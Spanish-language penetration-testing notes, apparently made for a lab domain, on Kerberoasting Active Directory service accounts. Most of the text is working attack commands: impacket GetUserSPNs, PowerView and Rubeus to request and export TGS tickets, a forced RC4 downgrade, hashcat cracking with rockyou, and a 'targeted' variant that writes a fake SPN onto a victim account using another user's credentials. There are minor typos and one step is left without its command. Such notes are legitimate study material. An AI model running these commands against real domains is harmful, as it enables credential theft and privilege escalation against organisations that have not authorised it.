#kerberoasting
Técnica de escalada de privilegios y movimiento lateral. Se atacan cuentas asociadas a SPN solicitando tickets TGT, para posteriormente crackearlos con hashcat. Cualquier usuario autenticado en el AD puede solictar un ticket TGS.
## Linux
Necesitamos tener credenciales de acceso (texto plano o NTML hash) y una shell en el contexto del usuario de dominio o `SYSTEM` shell
- Listar cuentas SPN - GetUserSPNs.py 
	```bashowe
	impacket-GetUserSPNs -dc-ip $target INLANEFREIGHT.LOCAL/forend
	```
- Solicitar todos los tickets TGS (añadir la flag `-requets` al comando anterior)
	```bash
	GetUserSPNs.py -dc-ip $target INLANEFREIGHT.LOCAL/forend -request -outputfile allTickets
	```
- Solicitar el ticket de un solo servicio (ej: `sqldev`)
	```bash
	GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
	```

### Windows 
Se podría hacer de forma semi-manual si no funciona ninguna de estas opciones (documentado en notion)
#### Powerview
- Único target
	```powershell
	Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname 
	# Supongamos que a partir de aquí seleccionamos como objetivo sqldev 
	Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
	```
- Exportar todos los tickets en csv
	```powershell
	Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
	```
 
#### Rubeus
Tiene alguna opción adicional a las de PowerView
- Obtener información sobre tickts TGS
	```powershell
	.\Rubeus.exe kerberoast /stats
	```
- Extraer todos los tickets TGS
	```powershell
	Rubeus.exe kerberoast /nowrap
	```
- Extraer los tickets de las cuentas más valiosas (`admincount=1`)
	```powershell
	.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
	```
- Extraer spn de un servicio concreto (ej: `sqldev` )
#### Cambiando el formato del hash (downgrading) - hasta Windows Server 2019 
Las cuentas de servicio que tienen encriptación `AES 128/256`, también pueden ser craqueadas, pero el proceso es mucho más lento. (se podría hacer con `hashcat -m 19700`)
- Forzar a generar un ticket con encriptación `RC4 HMAC`
	```powershell
	.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
	```
### Craquear offline los tickets - hashcat
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

## Kerberoasting dirigido
La idea es tratar de craquear la cuenta de usuario que queramos creando un SPN falso asociado a ese usuario. Para poder realizar un ataque de este tipo necesitamos tener la capacidad de modificar o agregar SPNs en una cuenta de usuario. 
### Requisitos

| Permiso           | Descripción                                                  | Impacto en Kerberoasting Dirigido                     |
| ----------------- | ------------------------------------------------------------ | ----------------------------------------------------- |
| **GenericAll**    | Control total sobre el objeto.                               | Modifica cualquier atributo, incluido SPN.            |
| **GenericWrite**  | Escritura en cualquier atributo del objeto.                  | Permite añadir/modificar SPNs.                        |
| **WriteProperty** | Escritura en atributos específicos (`servicePrincipalName`). | Modifica solo atributos seleccionados.                |
| **WriteDACL**     | Modificación de la DACL para otorgarse permisos adicionales. | Otorga permisos como `GenericWrite` sobre SPN.        |
| **Self**          | Permite modificar ciertos atributos del propio objeto.       | Puede modificar su propio SPN si tiene `Self` en SPN. |
### Ataque 
- Creamos un objeto de tipo `$Cred` con las credenciales de un usuario que tenga permisos para crear un SPN (ej: `damundsen`)
	```powershell
	$pass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force 
	$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen',$pass )
	```
- Creamos un fake SPN con PowerView para el usuario que queramos comprometer (ej: `adunn`) - `Set-DomainObject`
```powershell
Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- Obtenemos información sobre el ticket creado con `rubeus`
	```powershell
	.\Rubeus.exe kerberoast /user:adunn /nowrap
	```
- Tratamos de craquear el ticket con `hashcat -m 13100`